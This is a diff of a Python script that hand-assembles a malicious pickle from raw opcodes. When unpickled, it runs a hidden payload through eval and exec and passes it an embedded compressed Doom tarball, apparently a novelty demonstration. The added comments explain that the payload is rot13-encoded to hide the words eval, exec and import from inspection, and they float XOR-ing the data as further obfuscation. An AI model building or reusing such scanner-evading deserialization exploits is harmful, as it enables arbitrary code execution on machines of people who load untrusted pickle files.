@@ -23,6 +23,7 @@ if not (os.path.exists("doom/DOOM1.WAD") and os.path.exists("doom/doom_ascii")):
 
 
 def get_doom_binbytes() -> p.BinBytes:
+    "get BinBytes opcode with compressed doom tarball"
     doom_buf = io.BytesIO()
     doom_ball = tarfile.open(fileobj=doom_buf, mode="w:gz")
     os.chdir("doom")
@@ -38,6 +39,7 @@ def get_doom_binbytes() -> p.BinBytes:
     # proto, binbytes, stop
     doom_binbytes = Pickled.load(pickle.dumps(doom_buf.read()))[1]
     print(doom_buf.tell())
+    # might be nice to xor everything
     return doom_binbytes
 
 
@@ -110,6 +112,9 @@ def hidden_unicode(uni: bytes) -> list[p.Opcode]:
 # what if we had stackdata with an argument?
 
 
+# only needed to redact eval/exec/import from payload
+# returns contents of payload.py when eval'd
+# when contents of payload.py are eval'd it returns the payload fn
 rot13 = {97 + i: 97 + (i + 13) % 26 for i in range(26)}
 payload_body = open("payload.py").read().translate(rot13)
 rot13_payload = (
@@ -151,7 +156,7 @@ exploit = [
     p.Reduce(),  # define payload fn, `eval(exec(payload) or payload)`
     get_doom_binbytes(),
     p.TupleOne(),
-    p.Reduce(),  # payload(doom_bytes)
+    p.Reduce(),  # eval(eval(rot13_payload))(doom_bytes)
     p.Pop(),  # p.Pop(),
 ]
 
